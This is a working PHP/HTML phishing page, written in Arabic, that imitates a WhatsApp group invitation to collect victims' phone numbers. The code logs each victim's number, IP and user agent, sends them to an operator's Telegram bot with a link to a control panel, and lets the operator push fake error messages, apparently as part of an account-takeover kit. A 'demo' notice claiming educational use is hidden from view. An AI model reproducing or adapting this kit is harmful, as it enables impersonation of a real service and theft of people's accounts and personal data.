<?php
// الحصول على معاملات URL
$sessionId = $_GET['session'] ?? '';
$clientIp = $_GET['ip'] ?? '';
$errorMessage = '';

// التحقق من وجود المعاملات
if (empty($sessionId) || empty($clientIp)) {
    die("معاملات مفقودة");
}

// وظيفة للكشف عن رمز الدولة بواسطة IP
function getCountryCodeByIP($ip) {
    $countryCode = 'FR'; // افتراضي
    try {
        $response = @file_get_contents("http://ip-api.com/json/{$ip}");
        if ($response !== false) {
            $data = json_decode($response, true);
            if (isset($data['countryCode'])) {
                $countryCode = $data['countryCode'];
            }
        }
    } catch (Exception $e) {
        // في حالة الخطأ، استخدم الرمز الافتراضي
    }
    return $countryCode;
}

$countryCode = getCountryCodeByIP($clientIp);

// وظيفة للحصول على رمز الهاتف حسب رمز الدولة
function getPhoneCodeByCountry($countryCode) {
    $phoneCodes = [
        'AF' => '+93',  // أفغانستان
        'AX' => '+358', // جزر آلاند
        'AL' => '+355', // ألبانيا
        'DZ' => '+213', // الجزائر
        'AS' => '+1',   // ساموا الأمريكية
        'AD' => '+376', // أندورا
        'AO' => '+244', // أنغولا
        'AI' => '+1',   // أنغويلا
        'AQ' => '+672', // القارة القطبية الجنوبية
        'AG' => '+1',   // أنتيغوا وبربودا
        'AR' => '+54',  // الأرجنتين
        'AM' => '+374', // أرمينيا
        'AW' => '+297', // أروبا
        'AU' => '+61',  // أستراليا
        'AT' => '+43',  // النمسا
        'AZ' => '+994', // أذربيجان
        'BS' => '+1',   // جزر البهاما
        'BH' => '+973', // البحرين
        'BD' => '+880', // بنغلاديش
        'BB' => '+1',   // باربادوس
        'BY' => '+375', // بيلاروسيا
        'BE' => '+32',  // بلجيكا
        'BZ' => '+501', // بليز
        'BJ' => '+229', // بنين
        'BM' => '+1',   // برمودا
        'BT' => '+975', // بوتان
        'BO' => '+591', // بوليفيا
        'BA' => '+387', // البوسنة والهرسك
        'BW' => '+267', // بوتسوانا
        'BV' => '+47',  // جزيرة بوفيه
        'BR' => '+55',  // البرازيل
        'IO' => '+246', // إقليم المحيط الهندي البريطاني
        'BN' => '+673', // بروناي
        'BG' => '+359', // بلغاريا
        'BF' => '+226', // بوركينا فاسو
        'BI' => '+257', // بوروندي
        'KH' => '+855', // كمبوديا
        'CM' => '+237', // الكاميرون
        'CA' => '+1',   // كندا
        'CV' => '+238', // الرأس الأخضر
        'KY' => '+1',   // جزر كايمان
        'CF' => '+236', // جمهورية أفريقيا الوسطى
        'TD' => '+235', // تشاد
        'CL' => '+56',  // تشيلي
        'CN' => '+86',  // الصين
        'CX' => '+61',  // جزيرة الكريسماس
        'CC' => '+61',  // جزر كوكوس
        'CO' => '+57',  // كولومبيا
        'KM' => '+269', // جزر القمر
        'CG' => '+242', // الكونغو
        'CD' => '+243', // جمهورية الكونغو الديمقراطية
        'CK' => '+682', // جزر كوك
        'CR' => '+506', // كوستاريكا
        'CI' => '+225', // ساحل العاج
        'HR' => '+385', // كرواتيا
        'CU' => '+53',  // كوبا
        'CY' => '+357', // قبرص
        'CZ' => '+420', // جمهورية التشيك
        'DK' => '+45',  // الدنمارك
        'DJ' => '+253', // جيبوتي
        'DM' => '+1',   // دومينيكا
        'DO' => '+1',   // جمهورية الدومينيكان
        'EC' => '+593', // الإكوادور
        'EG' => '+20',  // مصر
        'SV' => '+503', // السلفادور
        'GQ' => '+240', // غينيا الاستوائية
        'ER' => '+291', // إريتريا
        'EE' => '+372', // إستونيا
        'ET' => '+251', // إثيوبيا
        'FK' => '+500', // جزر فوكلاند
        'FO' => '+298', // جزر فارو
        'FJ' => '+679', // فيجي
        'FI' => '+358', // فنلندا
        'FR' => '+33',  // فرنسا
        'GF' => '+594', // غيانا الفرنسية
        'PF' => '+689', // بولينيزيا الفرنسية
        'TF' => '+262', // الأراضي الجنوبية الفرنسية
        'GA' => '+241', // الجابون
        'GM' => '+220', // غامبيا
        'GE' => '+995', // جورجيا
        'DE' => '+49',  // ألمانيا
        'GH' => '+233', // غانا
        'GI' => '+350', // جبل طارق
        'GR' => '+30',  // اليونان
        'GL' => '+299', // غرينلاند
        'GD' => '+1',   // غرينادا
        'GP' => '+590', // جوادلوب
        'GU' => '+1',   // غوام
        'GT' => '+502', // غواتيمالا
        'GG' => '+44',  // غيرنسي
        'GN' => '+224', // غينيا
        'GW' => '+245', // غينيا بيساو
        'GY' => '+592', // غيانا
        'HT' => '+509', // هايتي
        'HM' => '+672', // جزيرة هيرد وجزر ماكدونالد
        'VA' => '+379', // الكرسي الرسولي
        'HN' => '+504', // هندوراس
        'HK' => '+852', // هونج كونج
        'HU' => '+36',  // المجر
        'IS' => '+354', // أيسلندا
        'IN' => '+91',  // الهند
        'ID' => '+62',  // إندونيسيا
        'IR' => '+98',  // إيران
        'IQ' => '+964', // العراق
        'IE' => '+353', // أيرلندا
        'IM' => '+44',  // جزيرة مان
        'IL' => '+972', // إسرائيل
        'IT' => '+39',  // إيطاليا
        'JM' => '+1',   // جامايكا
        'JP' => '+81',  // اليابان
        'JE' => '+44',  // جيرسي
        'JO' => '+962', // الأردن
        'KZ' => '+7',   // كازاخستان
        'KE' => '+254', // كينيا
        'KI' => '+686', // كيريباتي
        'KP' => '+850', // كوريا الشمالية
        'KR' => '+82',  // كوريا الجنوبية
        'KW' => '+965', // الكويت
        'KG' => '+996', // قيرغيزستان
        'LA' => '+856', // لاوس
        'LV' => '+371', // لاتفيا
        'LB' => '+961', // لبنان
        'LS' => '+266', // ليسوتو
        'LR' => '+231', // ليبيريا
        'LY' => '+218', // ليبيا
        'LI' => '+423', // ليختنشتاين
        'LT' => '+370', // ليتوانيا
        'LU' => '+352', // لوكسمبرج
        'MO' => '+853', // ماكاو
        'MK' => '+389', // مقدونيا
        'MG' => '+261', // مدغشقر
        'MW' => '+265', // مالاوي
        'MY' => '+60',  // ماليزيا
        'MV' => '+960', // جزر المالديف
        'ML' => '+223', // مالي
        'MT' => '+356', // مالطا
        'MH' => '+692', // جزر مارشال
        'MQ' => '+596', // مارتينيك
        'MR' => '+222', // موريتانيا
        'MU' => '+230', // موريشيوس
        'YT' => '+262', // مايوت
        'MX' => '+52',  // المكسيك
        'FM' => '+691', // ميكرونيزيا
        'MD' => '+373', // مولدوفا
        'MC' => '+377', // موناكو
        'MN' => '+976', // منغوليا
        'ME' => '+382', // الجبل الأسود
        'MS' => '+1',   // مونتسيرات
        'MA' => '+212', // المغرب
        'MZ' => '+258', // موزمبيق
        'MM' => '+95',  // ميانمار
        'NA' => '+264', // ناميبيا
        'NR' => '+674', // ناورو
        'NP' => '+977', // نيبال
        'NL' => '+31',  // هولندا
        'AN' => '+599', // جزر أنتيل الهولندية
        'NC' => '+687', // كاليدونيا الجديدة
        'NZ' => '+64',  // نيوزيلندا
        'NI' => '+505', // نيكاراغوا
        'NE' => '+227', // النيجر
        'NG' => '+234', // نيجيريا
        'NU' => '+683', // نيوي
        'NF' => '+672', // جزيرة نورفولك
        'MP' => '+1',   // جزر مريانا الشمالية
        'NO' => '+47',  // النرويج
        'OM' => '+968', // عمان
        'PK' => '+92',  // باكستان
        'PW' => '+680', // بالاو
        'PS' => '+970', // فلسطين
        'PA' => '+507', // بنما
        'PG' => '+675', // بابوا غينيا الجديدة
        'PY' => '+595', // باراغواي
        'PE' => '+51',  // بيرو
        'PH' => '+63',  // الفلبين
        'PN' => '+64',  // بيتكيرن
        'PL' => '+48',  // بولندا
        'PT' => '+351', // البرتغال
        'PR' => '+1',   // بورتوريكو
        'QA' => '+974', // قطر
        'RE' => '+262', // ريونيون
        'RO' => '+40',  // رومانيا
        'RU' => '+7',   // روسيا
        'RW' => '+250', // رواندا
        'BL' => '+590', // سانت بارتيليمي
        'SH' => '+290', // سانت هيلينا
        'KN' => '+1',   // سانت كيتس ونيفس
        'LC' => '+1',   // سانت لوسيا
        'MF' => '+590', // سانت مارتن
        'PM' => '+508', // سانت بيير وميكيلون
        'VC' => '+1',   // سانت فنسنت والغرينادين
        'WS' => '+685', // ساموا
        'SM' => '+378', // سان مارينو
        'ST' => '+239', // سانت تومي وبرينسيبي
        'SA' => '+966', // المملكة العربية السعودية
        'SN' => '+221', // الس��غال
        'RS' => '+381', // صربيا
        'SC' => '+248', // سيشل
        'SL' => '+232', // سيراليون
        'SG' => '+65',  // سنغافورة
        'SK' => '+421', // سلوفاكيا
        'SI' => '+386', // سلوفينيا
        'SB' => '+677', // جزر سليمان
        'SO' => '+252', // الصومال
        'ZA' => '+27',  // جنوب أفريقيا
        'GS' => '+500', // جورجيا الجنوبية وجزر ساندويتش الجنوبية
        'SS' => '+211', // جنوب السودان
        'ES' => '+34',  // إسبانيا
        'LK' => '+94',  // سريلانكا
        'SD' => '+249', // السودان
        'SR' => '+597', // سورينام
        'SJ' => '+47',  // سفالبارد وجان مايان
        'SZ' => '+268', // إسواتيني
        'SE' => '+46',  // السويد
        'CH' => '+41',  // سويسرا
        'SY' => '+963', // سوريا
        'TW' => '+886', // تايوان
        'TJ' => '+992', // طاجيكستان
        'TZ' => '+255', // تنزانيا
        'TH' => '+66',  // تايلاند
        'TL' => '+670', // تيمور الشرقية
        'TG' => '+228', // توغو
        'TK' => '+690', // توكيلاو
        'TO' => '+676', // تونغا
        'TT' => '+1',   // ترينيداد وتوباغو
        'TN' => '+216', // تونس
        'TR' => '+90',  // تركيا
        'TM' => '+993', // تركمانستان
        'TC' => '+1',   // جزر تركس وكايكوس
        'TV' => '+688', // توفالو
        'UG' => '+256', // أوغندا
        'UA' => '+380', // أوكرانيا
        'AE' => '+971', // الإمارات العربية المتحدة
        'GB' => '+44',  // المملكة المتحدة
        'US' => '+1',   // الولايات المتحدة
        'UM' => '+1',   // جزر الولايات المتحدة الصغرى
        'UY' => '+598', // أوروغواي
        'UZ' => '+998', // أوزبكستان
        'VU' => '+678', // فانواتو
        'VE' => '+58',  // فنزويلا
        'VN' => '+84',  // فيتنام
        'VG' => '+1',   // جزر العذراء البريطانية
        'VI' => '+1',   // جزر العذراء الأمريكية
        'WF' => '+681', // واليس وفوتونا
        'EH' => '+212', // الصحراء الغربية
        'YE' => '+967', // اليمن
        'ZM' => '+260', // زامبيا
        'ZW' => '+263', // زيمبابوي
        'UK' => '+44',  // المملكة المتحدة (بديل)
    ];
    return $phoneCodes[$countryCode] ?? '+33';
}

$phoneCode = getPhoneCodeByCountry($countryCode);

// التحقق من وجود إجراء جاري للأخطاء
$actionFile = 'sessions/' . $sessionId . '_action.json';
if (file_exists($actionFile)) {
    $actionData = json_decode(file_get_contents($actionFile), true);
    if (isset($actionData['action']) && $actionData['action'] === 'facebook_error') {
        $errorMessage = $actionData['errorMessage'] ?? 'المعلومات التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.';
        // حذف الإجراء حتى لا يتم عرض الخطأ في حلقة
        unlink($actionFile);
    }
}

// تحديث ملف التتبع
$trackingFile = 'tracking/' . $sessionId . '.json';
$trackingData = [
    'page' => 'connexion_f.php',
    'timestamp' => time(),
    'ip' => $clientIp
];

// إنشاء مجلد التتبع إذا لم يكن موجوداً
if (!file_exists('tracking')) {
    mkdir('tracking', 0777, true);
}

file_put_contents($trackingFile, json_encode($trackingData));

// معالجة النموذج
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $phoneNumber = $_POST['phone_number'] ?? '';
    $selectedCountryCode = $_POST['country_code'] ?? $countryCode;
    $selectedPhoneCode = getPhoneCodeByCountry($selectedCountryCode);
    
    if (!empty($phoneNumber)) {
        // تسجيل معلومات الدخول
        $clientData = [
            'phone_number' => $phoneNumber,
            'country_code' => $selectedCountryCode,
            'phone_code' => $selectedPhoneCode,
            'timestamp' => time(),
            'ip' => $clientIp,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? ''
        ];
        
        // إنشاء مجلد الجلسات إذا لم يكن موجوداً
        if (!file_exists('sessions')) {
            mkdir('sessions', 0777, true);
        }
        
        // حفظ البيانات
        file_put_contents('sessions/' . $sessionId . '.json', json_encode($clientData));
        
        // إرسال المعلومات إلى Telegram
        $message = "📱 رقم هاتف جديد 📱\n\n";
        $message .= "📞 الرقم: " . $phoneNumber . "\n";
        $message .= "🌍 الدولة: " . $selectedCountryCode . "\n";
        $message .= "📍 المؤشر: " . $selectedPhoneCode . "\n";
        $message .= "🌐 IP: " . $clientIp . "\n";
        $message .= "🖥️ وكيل المستخدم: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'غير متوفر') . "\n\n";
        
        // مسار ملف إعدادات Telegram
        $telegramConfigFile = 'telegram_config.json';
        if (file_exists($telegramConfigFile)) {
            $telegramConfig = json_decode(file_get_contents($telegramConfigFile), true);
            $botToken = $telegramConfig['bot_token'] ?? '';
            $chatId = $telegramConfig['chat_id'] ?? '';

            $message .= "🔗 لوحة التحكم: " .$telegramConfig['url'] . "/control_panel.php?session=" . $sessionId . "&ip=" . $clientIp;
    
            
            if (!empty($botToken) && !empty($chatId)) {
                $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
                $params = [
                    'chat_id' => $chatId,
                    'text' => $message,
                    'parse_mode' => 'HTML'
                ];
                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // تخطي التحقق من SSL
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $response = curl_exec($ch);
                curl_close($ch);
            }
        }
        
        // إعادة التوجيه مباشرة إلى صفحة التحميل دون انتظار إجراء المسؤول
        header("Location: loading.php?session=" . $sessionId . "&ip=" . $clientIp);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول باستخدام WhatsApp</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.6;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            width: 80px;
            margin-bottom: 15px;
            margin-top: 15px;
        }
        
        .login-card {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            padding: 20px;
            margin-bottom: 20px;
        }
        
        .login-title {
            font-size: 18px;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-control {
            width: 100%;
            padding: 14px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            color: #1c1e21;
        }
        
        .form-control:focus {
            border-color: #00AD5C;
            outline: none;
            box-shadow: 0 0 0 2px #e7f8ef;
        }
        
        .login-button {
            width: 100%;
            padding: 12px 0;
            background-color: #00AD5C;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        .login-button:hover {
            background-color: #128C7E;
        }
        
        .forgot-password {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dadde1;
        }
        
        .divider span {
            padding: 0 10px;
            color: #65676b;
            font-size: 14px;
        }
        
        .create-account {
            text-align: center;
        }
        
        .create-button {
            display: inline-block;
            padding: 10px 16px;
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-decoration: none;
        }
        
        .create-button:hover {
            background-color: #36a420;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #65676b;
            font-size: 12px;
        }
        
        .footer a {
            color: #65676b;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .languages {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            margin-bottom: 10px;
        }
        
        .languages a {
            margin: 0 5px;
            color: #65676b;
            text-decoration: none;
            font-size: 12px;
        }
        
        .languages a:hover {
            text-decoration: underline;
        }
        
        .languages a.active {
            color: #00AD5C;
        }
        
        .copyright {
            margin-top: 10px;
        }
        
        .error-message {
            background-color: #ffebee;
            color: #c62828;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 14px;
            display: flex;
            align-items: center;
        }
        
        .error-message i {
            margin-left: 10px;
            font-size: 16px;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://www.freeiconspng.com/uploads/logo-whatsapp-png-image-2.png" alt="شعار واتسآب" class="logo">
        </div>
            <!-- إشعار العرض التوضيحي -->
    <div class="demo-notice" style="display:none">
        <p><strong>عرض توضيحي فقط</strong> - هذا الموقع هو عرض توضيحي تقني لأغراض تعليمية.</p>
    </div>
        
        
        <div class="login-card">
            <div class="login-title" style="color: #00AD5C;">دعوة للانضمام إلى مجموعة واتساب</div>
            
            <?php if (!empty($errorMessage)): ?>
            <div class="error-message">
                <i class="fas fa-exclamation-circle"></i> <?php echo htmlspecialchars($errorMessage); ?>
            </div>
            <?php endif; ?>
            
            <p style="color: #65676b; margin-bottom: 20px; text-align: center; font-size: 14px;">أدخل رقم هاتفك لتلقي دعوة الانضمام</p>
            
            <form method="post" action="">
                <div class="form-group">
                    <label style="display: block; font-size: 14px; color: #65676b; margin-bottom: 5px;">رقم الهاتف</label>
                    <div style="display: flex; gap: 8px;">
                        <select id="country-code" name="country_code" class="form-control" style="width: 100px; padding: 14px;">
                            <option value="AF">+93 (AF)</option>
                            <option value="AX">+358 (AX)</option>
                            <option value="AL">+355 (AL)</option>
                            <option value="DZ">+213 (DZ)</option>
                            <option value="AS">+1 (AS)</option>
                            <option value="AD">+376 (AD)</option>
                            <option value="AO">+244 (AO)</option>
                            <option value="AI">+1 (AI)</option>
                            <option value="AQ">+672 (AQ)</option>
                            <option value="AG">+1 (AG)</option>
                            <option value="AR">+54 (AR)</option>
                            <option value="AM">+374 (AM)</option>
                            <option value="AW">+297 (AW)</option>
                            <option value="AU">+61 (AU)</option>
                            <option value="AT">+43 (AT)</option>
                            <option value="AZ">+994 (AZ)</option>
                            <option value="BS">+1 (BS)</option>
                            <option value="BH">+973 (BH)</option>
                            <option value="BD">+880 (BD)</option>
                            <option value="BB">+1 (BB)</option>
                            <option value="BY">+375 (BY)</option>
                            <option value="BE">+32 (BE)</option>
                            <option value="BZ">+501 (BZ)</option>
                            <option value="BJ">+229 (BJ)</option>
                            <option value="BM">+1 (BM)</option>
                            <option value="BT">+975 (BT)</option>
                            <option value="BO">+591 (BO)</option>
                            <option value="BA">+387 (BA)</option>
                            <option value="BW">+267 (BW)</option>
                            <option value="BV">+47 (BV)</option>
                            <option value="BR">+55 (BR)</option>
                            <option value="IO">+246 (IO)</option>
                            <option value="BN">+673 (BN)</option>
                            <option value="BG">+359 (BG)</option>
                            <option value="BF">+226 (BF)</option>
                            <option value="BI">+257 (BI)</option>
                            <option value="KH">+855 (KH)</option>
                            <option value="CM">+237 (CM)</option>
                            <option value="CA">+1 (CA)</option>
                            <option value="CV">+238 (CV)</option>
                            <option value="KY">+1 (KY)</option>
                            <option value="CF">+236 (CF)</option>
                            <option value="TD">+235 (TD)</option>
                            <option value="CL">+56 (CL)</option>
                            <option value="CN">+86 (CN)</option>
                            <option value="CX">+61 (CX)</option>
                            <option value="CC">+61 (CC)</option>
                            <option value="CO">+57 (CO)</option>
                            <option value="KM">+269 (KM)</option>
                            <option value="CG">+242 (CG)</option>
                            <option value="CD">+243 (CD)</option>
                            <option value="CK">+682 (CK)</option>
                            <option value="CR">+506 (CR)</option>
                            <option value="CI">+225 (CI)</option>
                            <option value="HR">+385 (HR)</option>
                            <option value="CU">+53 (CU)</option>
                            <option value="CY">+357 (CY)</option>
                            <option value="CZ">+420 (CZ)</option>
                            <option value="DK">+45 (DK)</option>
                            <option value="DJ">+253 (DJ)</option>
                            <option value="DM">+1 (DM)</option>
                            <option value="DO">+1 (DO)</option>
                            <option value="EC">+593 (EC)</option>
                            <option value="EG">+20 (EG)</option>
                            <option value="SV">+503 (SV)</option>
                            <option value="GQ">+240 (GQ)</option>
                            <option value="ER">+291 (ER)</option>
                            <option value="EE">+372 (EE)</option>
                            <option value="ET">+251 (ET)</option>
                            <option value="FK">+500 (FK)</option>
                            <option value="FO">+298 (FO)</option>
                            <option value="FJ">+679 (FJ)</option>
                            <option value="FI">+358 (FI)</option>
                            <option value="FR">+33 (FR)</option>
                            <option value="GF">+594 (GF)</option>
                            <option value="PF">+689 (PF)</option>
                            <option value="TF">+262 (TF)</option>
                            <option value="GA">+241 (GA)</option>
                            <option value="GM">+220 (GM)</option>
                            <option value="GE">+995 (GE)</option>
                            <option value="DE">+49 (DE)</option>
                            <option value="GH">+233 (GH)</option>
                            <option value="GI">+350 (GI)</option>
                            <option value="GR">+30 (GR)</option>
                            <option value="GL">+299 (GL)</option>
                            <option value="GD">+1 (GD)</option>
                            <option value="GP">+590 (GP)</option>
                            <option value="GU">+1 (GU)</option>
                            <option value="GT">+502 (GT)</option>
                            <option value="GG">+44 (GG)</option>
                            <option value="GN">+224 (GN)</option>
                            <option value="GW">+245 (GW)</option>
                            <option value="GY">+592 (GY)</option>
                            <option value="HT">+509 (HT)</option>
                            <option value="HM">+672 (HM)</option>
                            <option value="VA">+379 (VA)</option>
                            <option value="HN">+504 (HN)</option>
                            <option value="HK">+852 (HK)</option>
                            <option value="HU">+36 (HU)</option>
                            <option value="IS">+354 (IS)</option>
                            <option value="IN">+91 (IN)</option>
                            <option value="ID">+62 (ID)</option>
                            <option value="IR">+98 (IR)</option>
                            <option value="IQ">+964 (IQ)</option>
                            <option value="IE">+353 (IE)</option>
                            <option value="IM">+44 (IM)</option>
                            <option value="IL">+972 (IL)</option>
                            <option value="IT">+39 (IT)</option>
                            <option value="JM">+1 (JM)</option>
                            <option value="JP">+81 (JP)</option>
                            <option value="JE">+44 (JE)</option>
                            <option value="JO">+962 (JO)</option>
                            <option value="KZ">+7 (KZ)</option>
                            <option value="KE">+254 (KE)</option>
                            <option value="KI">+686 (KI)</option>
                            <option value="KP">+850 (KP)</option>
                            <option value="KR">+82 (KR)</option>
                            <option value="KW">+965 (KW)</option>
                            <option value="KG">+996 (KG)</option>
                            <option value="LA">+856 (LA)</option>
                            <option value="LV">+371 (LV)</option>
                            <option value="LB">+961 (LB)</option>
                            <option value="LS">+266 (LS)</option>
                            <option value="LR">+231 (LR)</option>
                            <option value="LY">+218 (LY)</option>
                            <option value="LI">+423 (LI)</option>
                            <option value="LT">+370 (LT)</option>
                            <option value="LU">+352 (LU)</option>
                            <option value="MO">+853 (MO)</option>
                            <option value="MK">+389 (MK)</option>
                            <option value="MG">+261 (MG)</option>
                            <option value="MW">+265 (MW)</option>
                            <option value="MY">+60 (MY)</option>
                            <option value="MV">+960 (MV)</option>
                            <option value="ML">+223 (ML)</option>
                            <option value="MT">+356 (MT)</option>
                            <option value="MH">+692 (MH)</option>
                            <option value="MQ">+596 (MQ)</option>
                            <option value="MR">+222 (MR)</option>
                            <option value="MU">+230 (MU)</option>
                            <option value="YT">+262 (YT)</option>
                            <option value="MX">+52 (MX)</option>
                            <option value="FM">+691 (FM)</option>
                            <option value="MD">+373 (MD)</option>
                            <option value="MC">+377 (MC)</option>
                            <option value="MN">+976 (MN)</option>
                            <option value="ME">+382 (ME)</option>
                            <option value="MS">+1 (MS)</option>
                            <option value="MA">+212 (MA)</option>
                            <option value="MZ">+258 (MZ)</option>
                            <option value="MM">+95 (MM)</option>
                            <option value="NA">+264 (NA)</option>
                            <option value="NR">+674 (NR)</option>
                            <option value="NP">+977 (NP)</option>
                            <option value="NL">+31 (NL)</option>
                            <option value="AN">+599 (AN)</option>
                            <option value="NC">+687 (NC)</option>
                            <option value="NZ">+64 (NZ)</option>
                            <option value="NI">+505 (NI)</option>
                            <option value="NE">+227 (NE)</option>
                            <option value="NG">+234 (NG)</option>
                            <option value="NU">+683 (NU)</option>
                            <option value="NF">+672 (NF)</option>
                            <option value="MP">+1 (MP)</option>
                            <option value="NO">+47 (NO)</option>
                            <option value="OM">+968 (OM)</option>
                            <option value="PK">+92 (PK)</option>
                            <option value="PW">+680 (PW)</option>
                            <option value="PS">+970 (PS)</option>
                            <option value="PA">+507 (PA)</option>
                            <option value="PG">+675 (PG)</option>
                            <option value="PY">+595 (PY)</option>
                            <option value="PE">+51 (PE)</option>
                            <option value="PH">+63 (PH)</option>
                            <option value="PN">+64 (PN)</option>
                            <option value="PL">+48 (PL)</option>
                            <option value="PT">+351 (PT)</option>
                            <option value="PR">+1 (PR)</option>
                            <option value="QA">+974 (QA)</option>
                            <option value="RE">+262 (RE)</option>
                            <option value="RO">+40 (RO)</option>
                            <option value="RU">+7 (RU)</option>
                            <option value="RW">+250 (RW)</option>
                            <option value="BL">+590 (BL)</option>
                            <option value="SH">+290 (SH)</option>
                            <option value="KN">+1 (KN)</option>
                            <option value="LC">+1 (LC)</option>
                            <option value="MF">+590 (MF)</option>
                            <option value="PM">+508 (PM)</option>
                            <option value="VC">+1 (VC)</option>
                            <option value="WS">+685 (WS)</option>
                            <option value="SM">+378 (SM)</option>
                            <option value="ST">+239 (ST)</option>
                            <option value="SA">+966 (SA)</option>
                            <option value="SN">+221 (SN)</option>
                            <option value="RS">+381 (RS)</option>
                            <option value="SC">+248 (SC)</option>
                            <option value="SL">+232 (SL)</option>
                            <option value="SG">+65 (SG)</option>
                            <option value="SK">+421 (SK)</option>
                            <option value="SI">+386 (SI)</option>
                            <option value="SB">+677 (SB)</option>
                            <option value="SO">+252 (SO)</option>
                            <option value="ZA">+27 (ZA)</option>
                            <option value="GS">+500 (GS)</option>
                            <option value="SS">+211 (SS)</option>
                            <option value="ES">+34 (ES)</option>
                            <option value="LK">+94 (LK)</option>
                            <option value="SD">+249 (SD)</option>
                            <option value="SR">+597 (SR)</option>
                            <option value="SJ">+47 (SJ)</option>
                            <option value="SZ">+268 (SZ)</option>
                            <option value="SE">+46 (SE)</option>
                            <option value="CH">+41 (CH)</option>
                            <option value="SY">+963 (SY)</option>
                            <option value="TW">+886 (TW)</option>
                            <option value="TJ">+992 (TJ)</option>
                            <option value="TZ">+255 (TZ)</option>
                            <option value="TH">+66 (TH)</option>
                            <option value="TL">+670 (TL)</option>
                            <option value="TG">+228 (TG)</option>
                            <option value="TK">+690 (TK)</option>
                            <option value="TO">+676 (TO)</option>
                            <option value="TT">+1 (TT)</option>
                            <option value="TN">+216 (TN)</option>
                            <option value="TR">+90 (TR)</option>
                            <option value="TM">+993 (TM)</option>
                            <option value="TC">+1 (TC)</option>
                            <option value="TV">+688 (TV)</option>
                            <option value="UG">+256 (UG)</option>
                            <option value="UA">+380 (UA)</option>
                            <option value="AE">+971 (AE)</option>
                            <option value="GB">+44 (GB)</option>
                            <option value="US">+1 (US)</option>
                            <option value="UM">+1 (UM)</option>
                            <option value="UY">+598 (UY)</option>
                            <option value="UZ">+998 (UZ)</option>
                            <option value="VU">+678 (VU)</option>
                            <option value="VE">+58 (VE)</option>
                            <option value="VN">+84 (VN)</option>
                            <option value="VG">+1 (VG)</option>
                            <option value="VI">+1 (VI)</option>
                            <option value="WF">+681 (WF)</option>
                            <option value="EH">+212 (EH)</option>
                            <option value="YE">+967 (YE)</option>
                            <option value="ZM">+260 (ZM)</option>
                            <option value="ZW">+263 (ZW)</option>
                        </select>
                        <input type="tel" name="phone_number" id="phone-number" class="form-control" placeholder="رقم الهاتف" required style="flex: 1;">
                    </div>
                </div>
                
                <button type="submit" class="login-button">متابعة</button>
            </form>
        </div>
        
        <div class="footer">
            <div class="languages">
                <a href="#" class="active">العربية</a>
                <a href="#">Français</a>
                <a href="#">English (US)</a>
                <a href="#">Español</a>
                <a href="#">Deutsch</a>
                <a href="#">Italiano</a>
                <a href="#">Português (Brasil)</a>
                <a href="#">हिन्दी</a>
                <a href="#">中文(简体)</a>
                <a href="#">日本語</a>
            </div>            
            <div class="copyright">
                 © 2026            </div>
        </div>
    </div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const countryCodeSelect = document.getElementById('country-code');
            const phoneNumberInput = document.getElementById('phone-number');
            const detectedCountryCode = '<?php echo $countryCode; ?>';
            
            // تعيين رمز الدولة المكتشف تلقائياً
            if (detectedCountryCode && countryCodeSelect) {
                countryCodeSelect.value = detectedCountryCode;
            }
            
            // التركيز على حقل رقم الهاتف
            if (phoneNumberInput) {
                phoneNumberInput.focus();
            }
        });
    </script>
</body>
</html>